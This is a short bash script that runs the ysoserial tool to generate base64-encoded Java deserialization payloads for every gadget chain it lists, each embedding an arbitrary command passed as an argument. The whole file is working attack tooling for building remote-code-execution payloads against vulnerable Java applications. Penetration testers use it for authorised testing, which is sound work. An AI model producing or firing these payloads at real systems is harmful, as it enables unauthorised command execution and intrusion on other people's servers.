#!/bin/bash

# Usage: ./generate_payloads.sh <command>
# This script generates serialized payloads using ysoserial for a specified command.
# It requires ysoserial-all.jar to be present in the same directory.

# Check if the correct number of arguments are provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 <command>"
    exit 1
fi

# Assign the command argument to a variable
command="$1"

# Clean up any previous output directory
rm -rf ./output

# Generate the list of payloads and process them
java -jar ./ysoserial-all.jar > yso 2>&1
cat yso | tr -d ' ' | cut -d '@' -f 1 > payloads.txt
sed -i -e '1,8d' payloads.txt

# Create a new output directory
mkdir ./output

# Loop through each payload, generating and storing the corresponding serialized object
while read payloadname; do
    echo "Generating payload for: $payloadname"
    java -jar ./ysoserial-all.jar "$payloadname" "$command" | base64 -w 0 > ./output/"$payloadname"
done < ./payloads.txt

# Clean up temporary files
rm -rf yso payloads.txt
